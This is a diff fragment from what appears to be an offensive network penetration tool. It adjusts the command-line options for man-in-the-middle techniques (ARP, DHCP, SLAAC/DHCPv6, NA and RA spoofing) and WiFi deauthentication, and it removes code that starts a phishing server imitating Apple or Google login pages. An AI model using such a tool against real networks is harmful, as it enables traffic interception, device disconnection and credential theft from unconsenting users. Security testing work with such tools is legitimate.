-            thread_manager.add_task(self._na_spoof)
-        # endregion
-
-        # region 6. RA Spoofing (IPv6)
-        if self._mitm_technique == 6:
-            thread_manager.add_task(self._ra_spoof)
-        # endregion
-
-        # region Disconnect device
-        if disconnect:
-            thread_manager.add_task(self._disconnect_device)
-        # endregion
-
-        # region Phishing server
-        if phishing_site is None:
-            phishing_site = 'apple'
-        phishing_server: PhishingServer = PhishingServer()
-        phishing_server.start(address='0.0.0.0', port=80, site=phishing_site,
-                              redirect='authentication.net', quiet=True)
-        # endregion
-
-    # endregion
-
 # endregion
 
 
@@ -624,25 +664,38 @@ def main():
     # region Parse script arguments
     parser: ArgumentParser = ArgumentParser(description=base.get_banner(__script_name__),
                                             formatter_class=RawTextHelpFormatter)
-    parser.add_argument('-T', '--technique', type=int, default=None,
-                        help='Set MiTM technique:'
-                             '\n1. ARP Spoofing'
-                             '\n2. Second DHCP ACK'
-                             '\n3. Predict next DHCP transaction ID'
-                             '\n4. Rogue SLAAC/DHCPv6 server'
-                             '\n5. NA Spoofing (IPv6)'
-                             '\n6. RA Spoofing (IPv6)')
-    parser.add_argument('-D', '--disconnect', type=int, default=None,
-                        help='Set device Disconnect technique:'
-                             '\n1. IPv4 network conflict detection'
-                             '\n2. Send WiFi deauthentication packets'
-                             '\n3. Do not disconnect device after MiTM')
+    if base.get_platform().startswith('Linux'):
+        parser.add_argument('-T', '--technique', type=int, default=None,
+                            help='Set MiTM technique:'
+                                 '\n1. ARP Spoofing'
+                                 '\n2. Second DHCP ACK'
+                                 '\n3. Predict next DHCP transaction ID'
+                                 '\n4. Rogue SLAAC/DHCPv6 server'
+                                 '\n5. NA Spoofing (IPv6)'
+                                 '\n6. RA Spoofing (IPv6)')
+        parser.add_argument('-D', '--disconnect', type=int, default=None,
+                            help='Set device Disconnect technique:'
+                                 '\n1. IPv4 network conflict detection'
+                                 '\n2. Send WiFi deauthentication packets'
+                                 '\n3. Do not disconnect device after MiTM')
+    else:
+        parser.add_argument('-T', '--technique', type=int, default=None,
+                            help='Set MiTM technique:'
+                                 '\n1. ARP Spoofing'
+                                 '\n2. Predict next DHCP transaction ID'
+                                 '\n3. Rogue SLAAC/DHCPv6 server'
+                                 '\n4. NA Spoofing (IPv6)'
+                                 '\n5. RA Spoofing (IPv6)')
+        parser.add_argument('-D', '--disconnect', type=int, default=None,
+                            help='Set device Disconnect technique:'
+                                 '\n1. IPv4 network conflict detection'
+                                 '\n2. Do not disconnect device after MiTM')
     parser.add_argument('-P', '--phishing_site', type=str, default='apple',
                         help='Set Phishing site "apple", "google" or Path to your site')
     parser.add_argument('-i', '--mitm_iface', type=str, help='Set interface name for MiTM')
     parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
-    parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 5)',
-                        default=5)
+    parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 25)',
+                        default=25)
     parser.add_argument('-g4', '--gateway_ipv4', type=str, help='Set gateway IPv4 address', default=None)
     parser.add_argument('-g6', '--gateway_ipv6', type=str, help='Set gateway IPv6 address', default=None)
     parser.add_argument('-d4', '--dns_ipv4', type=str, help='Set DNS server IPv4 address', default=None)
